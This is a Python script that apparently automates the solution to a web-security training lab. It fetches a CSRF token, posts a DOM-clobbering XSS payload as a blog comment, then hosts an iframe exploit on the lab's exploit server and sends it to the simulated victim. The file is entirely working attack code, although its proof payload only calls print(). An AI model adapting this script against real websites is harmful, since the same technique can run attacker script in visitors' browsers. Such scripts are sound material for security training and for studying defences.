import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
load_csrf = burp_url + '/post?postId=1'
post_it = burp_url + '/post/comment'

session = requests.Session()
response = session.get(load_csrf)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)


burp_data = {"csrf": csrf, "postId": "1", "comment": "<form id=x tabindex=0 onfocus=print()><input id=attributes>", "name": "1", "email": "1@1.com", "website": ''}
session.post(post_it, data=burp_data)

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<iframe src={burp_url}/post?postId=1 onload=\"setTimeout(()=>this.src=this.src+'#x',500)\">\r\n", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)


deliver = exploit_server + '/deliver-to-victim'
session.get(deliver)
